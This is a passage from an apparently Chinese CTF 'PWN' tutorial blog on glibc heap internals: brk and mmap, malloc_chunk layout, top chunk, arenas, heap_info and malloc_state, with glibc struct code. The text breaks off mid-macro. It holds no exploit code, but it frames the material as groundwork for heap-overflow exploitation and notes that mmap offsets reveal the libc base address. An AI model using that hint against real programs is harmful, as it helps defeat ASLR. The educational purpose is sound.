<p><em>通常来说，当堆块释放后，如果与另一个被释放的堆块或者 <code>top chunk</code> 相邻，则这些空间会被合并</em>（<strong>但是 fast bin 是个特例，不会轻易合并</strong>）</p>
<hr>
<h3 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h3><blockquote>
<p>无论是 <code>malloc</code> 函数还是 <code>free</code> 函数，我们动态申请和释放内存时，都经常会使用，但是它们并不是真正与系统交互的函数</p>
<p>这些函数背后的系统调用主要是 <code>brk</code> 函数以及 <code>mmap</code> 函数</p>
</blockquote>
<ol>
<li><code>brk</code> 是将 DATA 数据段的最高地址指针 <code>_edata</code> 往高地址推（<code>_edata</code> 指向数据段的最高地址）</li>
<li><code>mmap</code> 是在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存</li>
</ol>
<p><code>brk</code> 和 <code>mmap</code> 这两种方式分配的都是虚拟内存，没有分配物理内存</p>
<p>在第一次访问已分配的虚拟地址空间的时候，发生缺页中断，操作系统负责分配物理内存，然后建立虚拟内存和物理内存之间的映射关系</p>
<ul>
<li><code>malloc</code> 小于 <code>128k</code>（<code>0x20000</code> 字节）的内存时，使用 <code>brk</code> 分配内存</li>
<li><code>malloc</code> 大于等于 <code>128k</code>（<code>0x20000</code> 字节）的内存时，使用 <code>mmap</code> 分配内存，在堆和栈之间找一块空闲内存分配</li>
</ul>
<p>第一次执行 <code>malloc</code> 可能出现的系统调用如下：</p>
<p>[<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="CTF - PWN_堆与堆溢出19.png">](<a target="_blank" rel="noopener" href="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF">https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF</a> - PWN_堆与堆溢出19.png)</p>
<blockquote>
<p>注意：</p>
<p><code>brk</code> 会直接拓展原来的堆，<code>mmap</code> 会单独映射一块内存</p>
<p><strong><code>mmap</code> 分配的内存与 libc 基地址之前存在固定的偏移，因此可以推算出 libc 的基地址</strong></p>
</blockquote>
<hr>
<h4 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h4><blockquote>
<p>对于堆的操作，操作系统提供了 <code>brk</code> 函数，Glibc 库提供了 <code>sbrk</code> 函数，我们可以通过增加 <code>brk</code> 的大小来向操作系统申请内存</p>
</blockquote>
<p>初始时，堆的起始地址 <code>start_brk</code> 以及堆的当前末尾 <code>brk</code> 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同：</p>
<ul>
<li>不开启 ASLR 保护时，<code>start_brk</code> 以及 <code>brk</code> 会指向 DATA&#x2F;BSS 段的结尾。</li>
<li>开启 ASLR 保护时，<code>start_brk</code> 以及 <code>brk</code> 也会指向同一位置，只是这个位置是在 DATA&#x2F;BSS 段结尾后的随机偏移处</li>
</ul>
<p>[<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="CTF - PWN_堆与堆溢出18.png">](<a target="_blank" rel="noopener" href="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF">https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF</a> - PWN_堆与堆溢出18.png)</p>
<hr>
<h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><blockquote>
<p><code>malloc</code> 会使用 <code>mmap</code> 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用</p>
</blockquote>
<ul>
<li>在执行 <code>mmap</code> 之前，只有 <code>.so</code> 文件的 <code>mmap</code> 段</li>
<li>执行 <code>mmap</code> 之后，我们申请的内存与已经存在的内存段结合在了一起，构成了新的 <code>mmap</code> 段</li>
</ul>
<hr>
<h2 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h2><h3 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h3><h4 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h4><blockquote>
<p><code>chunk</code> 也叫块，在内存中表示的意思就是一块内存，这块内存在 <code>ptmalloc2</code> 内部用 <code>malloc_chunk</code> 结构体来表示</p>
<p>在程序的执行过程中，我们称由 <code>malloc()</code> 申请的内存为 <code>chunk</code>，<code>chunk</code> 也是堆的最小操作单元</p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-structure/#malloc_chunk">堆相关数据结构 - CTF Wiki</a></p>
</blockquote>
<p>[<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="CTF - PWN_堆与堆溢出15.png">](<a target="_blank" rel="noopener" href="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF">https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF</a> - PWN_堆与堆溢出15.png)</p>
<p><code>malloc_chunk</code> 的结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>一些参数的解释：</p>
<ul>
<li><code>prev_size</code><ol>
<li>如果该 <code>chunk</code> 的物理相邻的前一地址 <code>chunk</code>（两个指针的地址差值为前一个 <code>chunk</code> 的大小）是空闲的话，那么 <code>prev_size</code> 记录的是前一个 <code>chunk</code> 的大小（包括 <code>chunk</code> 头）</li>
<li>否则，<code>prev_size</code> 可以用来存储物理相邻的前一个 <code>chunk</code> 的数据。这里的前一个 <code>chunk</code> 指的是较低地址的 <code>chunk</code></li>
</ol>
</li>
<li><code>size</code><ol>
<li><code>size</code> 表示该 <code>chunk</code> 的大小，大小必须是 <code>2 * SIZE_SZ</code> 的整数倍。如果申请的内存大小不是 <code>2 * SIZE_SZ</code> 的整数倍，会被转换成满足大小的最小的 <code>2 * SIZE_SZ</code> 的倍数</li>
<li>32 位系统中，<code>SIZE_SZ</code> 是 4；64 位系统中，<code>SIZE_SZ</code> 是 8。 该字段的低三个比特位对 <code>chunk</code> 的大小没有影响，它们从高到低分别表示</li>
<li>一般来说，堆中第一个被分配的内存块的 <code>size</code> 字段的 <code>P</code> 位都会被设置为 1，以便于防止访问前面的非法内存；当一个 <code>chunk</code> 的 <code>size</code> 的 <code>P</code> 位为 0 时，我们能通过 <code>prev_size</code> 字段来获取上一个 <code>chunk</code> 的大小以及地址。这也方便进行空闲 <code>chunk</code> 之间的合并</li>
</ol>
</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>意义</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><code>（A）NON_MAIN_ARENA</code></td>
<td>记录当前 <code>chunk</code> 是否不属于主线程，1 表示不属于，0 表示属于</td>
<td></td>
</tr>
<tr>
<td><code>（M）IS_MAPPED</code></td>
<td>记录当前 <code>chunk</code> 是否是由 <code>mmap</code> 分配的</td>
<td></td>
</tr>
<tr>
<td><code>（P）PREV_INUSE</code></td>
<td>记录前一个 <code>chunk</code> 块是否被分配，0 表示空闲，1 表示使用中</td>
<td></td>
</tr>
</tbody></table>
<ul>
<li><code>fd、bk</code><ol>
<li><code>chunk</code> 处于分配状态时，从 <code>fd</code> 字段开始是用户的数据。<code>chunk</code> 空闲时，会被添加到对应的空闲管理链表中</li>
<li>通过 <code>fd</code> 和 <code>bk</code> 可以将空闲的 <code>chunk</code> 块加入到空闲的 <code>chunk</code> 块链表进行统一管理</li>
</ol>
</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td><code>fd</code></td>
<td>指向下一个（非物理相邻）空闲的 <code>chunk</code></td>
</tr>
<tr>
<td><code>bk</code></td>
<td>指向上一个（非物理相邻）空闲的 <code>chunk</code></td>
</tr>
</tbody></table>
<ul>
<li><code>fd_nextsize、bk_nextsize</code><ol>
<li>只有 <code>chunk</code> 空闲的时候才使用，不过其用于较大的 <code>chunk</code>（<code>large chunk</code>）</li>
<li>一般空闲的 <code>large chunk</code> 在 <code>fd</code> 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历</strong></li>
</ol>
</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td><code>fd_nextsize</code></td>
<td>指向前一个与当前 <code>chunk</code> 大小不同的第一个空闲块，不包含 <code>bin</code> 的头指针</td>
</tr>
<tr>
<td><code>bk_nextsize</code></td>
<td>指向后一个与当前 <code>chunk</code> 大小不同的第一个空闲块，不包含 <code>bin</code> 的头指针</td>
</tr>
</tbody></table>
<blockquote>
<p>注意：</p>
<p><strong>无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构</strong></p>
<p><em>虽然在分配状态和释放状态下，<code>chunk</code> 都是同一个数据结构，但是它们的表现形式是不一样的</em></p>
</blockquote>
<ul>
<li><code>chunk</code> 处于分配状态（<code>Allocated chunk</code>）：</li>
</ul>
<p>![](C:\Users\16350\Downloads\CTF - PWN_堆与堆溢出9.png)</p>
<p><strong>前两个字段称为 <code>chunk header</code>，后面的部分称为 <code>user data</code></strong></p>
<p>每次 <code>malloc</code> 申请得到的内存指针，其实指向 <code>user data</code> 的起始处</p>
<blockquote>
<p><code>chunk</code> 中的空间复用：</p>
<p>当一个 <code>chunk</code> 处于使用状态时，它的下一个 <code>chunk</code> 的 <code>prev_size</code> 域无效，所以下一个 <code>chunk</code> 的该部分也可以被当前 <code>chunk</code> 使用</p>
</blockquote>
<ul>
<li><code>chunk</code> 处于释放状态（<code>Freed chunk</code>）（可能是循环双向链表，也可能是单向链表）：</li>
</ul>
<p>![](C:\Users\16350\Downloads\CTF - PWN_堆与堆溢出8.png)</p>
<p>如果一个 <code>chunk</code> 处于 <code>free</code> 状态，那么会有两个位置记录其相应的大小：</p>
<ol>
<li>该 <code>chunk</code> 本身的 <code>size</code> 字段会记录</li>
<li>该 <code>chunk</code> 后面的一个 <code>chunk</code> 会记录</li>
</ol>
<blockquote>
<p>堆管理器会通过 <code>prev_size</code> 字段以及 <code>size</code> 字段合并两个物理相邻的空闲 <code>chunk</code> 块</p>
</blockquote>
<hr>
<h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><blockquote>
<p>程序第一次进行 <code>malloc</code> 的时候，<code>heap</code> 会被分为两块，一块给用户，剩下的那块就是 <code>top chunk</code>，简而言之，**<code>top chunk</code> 就是处于当前堆的物理地址最高的 <code>chunk</code>**</p>
<p><code>top chunk</code> 不属于任何一个 <code>bin</code>，它的作用在于：</p>
<ol>
<li>当所有的 <code>bin</code> 都无法满足用户请求的大小时，如果 <code>top chunk</code> 不小于用户请求的大小，就从 <code>top chunk</code> 中进行分配，并将剩下的部分作为新的 <code>top chunk</code></li>
<li>否则，就对 <code>heap</code> 进行扩展后再进行分配（在 <code>main arena</code> 中通过 <code>sbrk</code> 扩展 <code>heap</code>，而在 <code>thread arena</code> 中通过 <code>mmap</code> 分配新的 <code>heap</code>）</li>
</ol>
</blockquote>
<ul>
<li>初始情况下，可以将 <code>unsorted chunk</code> 作为 <code>top chunk</code></li>
<li><code>top chunk</code> 的 <code>PREV_INUSE</code> 位始终为 1（否则其前面的 <code>chunk</code> 就会被合并到 <code>top chunk</code> 中）</li>
</ul>
<hr>
<h4 id="last-remainder-chunk"><a href="#last-remainder-chunk" class="headerlink" title="last remainder chunk"></a>last remainder chunk</h4><blockquote>
<p>在用户使用 <code>malloc</code> 请求分配内存时，<code>ptmalloc2</code> 找到的 <code>chunk</code> 可能并不和申请的内存大小一致，这时候就将分割之后的剩余部分称之为 <code>last remainder chunk</code></p>
</blockquote>
<ul>
<li><code>unsorted bin</code> 也会存这一块</li>
<li><code>top chunk</code> 分割剩下的部分不会作为 <code>last remainder</code></li>
</ul>
<hr>
<h3 id="宏观结构"><a href="#宏观结构" class="headerlink" title="宏观结构"></a>宏观结构</h3><h4 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h4><blockquote>
<p>无论是主线程还是新创建的线程，在第一次申请内存时，都会有独立的 <code>arena</code>，<code>arena</code> 就是用来管理线程中的这些堆的，也可以理解为堆管理器所持有的内存池</p>
</blockquote>
<ul>
<li>一个线程只有一个 <code>arnea</code>，并且这些线程的 <code>arnea</code> 都是独立的不是相同的</li>
</ul>
<p>但也不是每一个线程都会有对应的 <code>arena</code>，对于不同系统，<code>arena</code> 数量的约束如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">txtFor 32 bit systems:</span><br><span class="line">     Number of arena = 2 * number of cores.</span><br><span class="line">For 64 bit systems:</span><br><span class="line">     Number of arena = 8 * number of cores.</span><br></pre></td></tr></table></figure>

<p>因为每个系统的核数是有限的，当线程数大于核数的二倍（超线程技术）时，就必然有线程处于等待状态，所以没有必要为每个线程分配一个 <code>arena</code></p>
<ul>
<li>主线程的 <code>arnea</code> 称为 <code>main_arena</code>，子线程的 <code>arnea</code> 称为 <code>thread_arena</code></li>
</ul>
<p>[<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="CTF - PWN_堆与堆溢出16.png">](<a target="_blank" rel="noopener" href="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF">https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF</a> - PWN_堆与堆溢出16.png)</p>
<ul>
<li>主线程无论一开始 <code>malloc</code> 多少空间，只要 <code>size &lt; 128KB</code>，<code>kernel</code> 都会分配 <code>132KB</code> 具有读写权限的 <code>heap segment</code>，这部分称为 <code>main_arena</code></li>
</ul>
<p>[<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="CTF - PWN_堆与堆溢出17.png">](<a target="_blank" rel="noopener" href="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF">https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF</a> - PWN_堆与堆溢出17.png)</p>
<p>例如这张图中：</p>
<p>[<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="CTF - PWN_堆与堆溢出2.png">](<a target="_blank" rel="noopener" href="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF">https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF</a> - PWN_堆与堆溢出2.png)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heap segment` 地址为 `0x555555559000 ~ 0x55555557a000`，具有 `rw` 权限，总共：`(0x55555557a000 - 0x555555559000)B / 1024 = 132KB</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：</p>
<p><code>main_arena</code> 并不在申请的 <code>heap</code> 中，而是一个全局变量，在 <code>libc.so</code> 的数据段中</p>
</blockquote>
<p>后续申请的内存会一直从这个 <code>arena</code> 中获取，直到空间不足</p>
<p>当 <code>arena</code> 空间不足时，它可以通过增加 <code>brk</code> 的方式来增加堆的空间；类似地，<code>arena</code> 也可以通过减小 <code>brk</code> 来缩小自己的空间</p>
<p>即使将所有 <code>main_arena</code> 所分配出去的内存块 <code>free</code> 完，也不会立即还给 <code>kernel</code>，而是交由 Glibc 来管理。当后面程序再次申请内存时，在 Glibc 中管理的内存充足的情况下，Glibc 就会根据堆分配的算法来给程序分配相应的内存</p>
<hr>
<h4 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h4><blockquote>
<p>程序刚开始执行时，每个线程是没有 <code>heap</code> 区域的。当其申请内存时，就需要 <code>heap_info</code> 这个结构来记录对应的信息</p>
<p>当该 <code>heap</code> 的资源被使用完后，就必须得再次申请内存了。此外，一般申请的 <code>heap</code> 是不连续的，因此需要记录不同 <code>heap</code> 之间的链接结构</p>
</blockquote>
<ul>
<li><strong><code>heap_info</code> 这个数据结构是专门为从 <code>Memory Mapping Segment</code> 处申请的内存准备的，即为非主线程准备的</strong></li>
<li>主线程可以通过 <code>sbrk()</code> 函数扩展 <code>program break location</code> 获得（直到触及 <code>Memory Mapping Segment</code>），只有一个 <code>heap</code>，没有 <code>heap_info</code> 数据结构</li>
</ul>
<p><code>heap_info</code> 的主要结构如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HEAP_MIN_SIZE (32 * 1024)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HEAP_MAX_SIZE</span></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> DEFAULT_MMAP_THRESHOLD_MAX</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX)</span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> HEAP_MAX_SIZE (1024 * 1024) <span class="comment">/* must be a power of two */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps</span></span><br><span class="line"><span class="comment">   that are dynamically created for multi-threaded programs.  The</span></span><br><span class="line"><span class="comment">   maximum size must be a power of two, for fast determination of</span></span><br><span class="line"><span class="comment">   which heap belongs to a chunk.  It should be much larger than the</span></span><br><span class="line"><span class="comment">   mmap threshold, so that requests with a size just below that</span></span><br><span class="line"><span class="comment">   threshold can be fulfilled without creating too many heaps.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* A heap is a single contiguous memory region holding (coalesceable)</span></span><br><span class="line"><span class="comment">   malloc_chunks.  It is allocated with mmap() and always starts at an</span></span><br><span class="line"><span class="comment">   address aligned to HEAP_MAX_SIZE.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_heap_info</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_heap_info</span> *prev; <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="type">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure>

<p>该结构主要是描述堆的基本信息，包括：</p>
<ul>
<li>堆对应的 <code>arena</code> 的地址</li>
<li>由于一个线程申请一个堆之后，可能会使用完，之后就必须得再次申请。因此，一个线程可能会有多个堆。<code>prev</code> 即记录了上一个 <code>heap_info</code> 的地址。这里可以看到每个堆的 <code>heap_info</code> 是通过单向链表进行链接的</li>
<li><code>size</code> 表示当前堆的大小</li>
<li><code>pad</code> 确保分配的空间是按照 <code>MALLOC_ALIGN_MASK + 1</code> 对齐的</li>
</ul>
<hr>
<h4 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h4><blockquote>
<p><code>malloc_state</code> 结构用于管理堆，记录每个 <code>arena</code> 当前申请的内存的具体状态，例如：是否有空闲 <code>chunk</code>，空闲 <code>chunk</code> 的大小等等</p>
</blockquote>
<ul>
<li>无论是 <code>thread_arena</code> 还是 <code>main_arena</code>，它们都只有一个 <code>malloc state</code> 结构</li>
<li>由于 <code>thread</code> 的 <code>arena</code> 可能有多个，<code>malloc state</code> 结构会在最新申请的 <code>arena</code> 中</li>
</ul>
<p><code>malloc_state</code> 的结构如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_state</span> &#123;</span><br><span class="line">    <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    __libc_lock_define(, mutex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">    <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    mchunkptr top;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">    mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> binmap[ BINMAPSIZE ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list, points to the next arena */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">       by free_list_lock in arena.c.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next_free;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">       the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">       free_list_lock in arena.c.  */</span></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>libc_lock_define(, mutex)</code><br>该变量用于控制程序串行访问同一个分配区，当一个线程获取了分配区之后，其它线程要想访问该分配区，就必须等待该线程分配完成后才能够使用。</li>
<li><code>flags</code><br><code>flags</code> 记录了分配区的一些标志，比如 <code>bit0</code> 记录了分配区是否有 <code>fast bin chunk</code>，<code>bit1</code> 标识分配区是否能返回连续的虚拟地址空间。具体如下：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span></span><br><span class="line"><span class="comment">   some fastbin chunks. It is set true on entering a chunk into any</span></span><br><span class="line"><span class="comment">   fastbin, and cleared only in malloc_consolidate.</span></span><br><span class="line"><span class="comment">   The truth value is inverted so that have_fastchunks will be true</span></span><br><span class="line"><span class="comment">   upon startup (since statics are zero-filled), simplifying</span></span><br><span class="line"><span class="comment">   initialization checks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FASTCHUNKS_BIT (1U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span></span><br><span class="line"><span class="comment">   regions.  Otherwise, contiguity is exploited in merging together,</span></span><br><span class="line"><span class="comment">   when possible, results from consecutive MORECORE calls.</span></span><br><span class="line"><span class="comment">   The initial value comes from MORECORE_CONTIGUOUS, but is</span></span><br><span class="line"><span class="comment">   changed dynamically if mmap is ever used as an sbrk substitute.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NONCONTIGUOUS_BIT (2U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> noncontiguous(M) 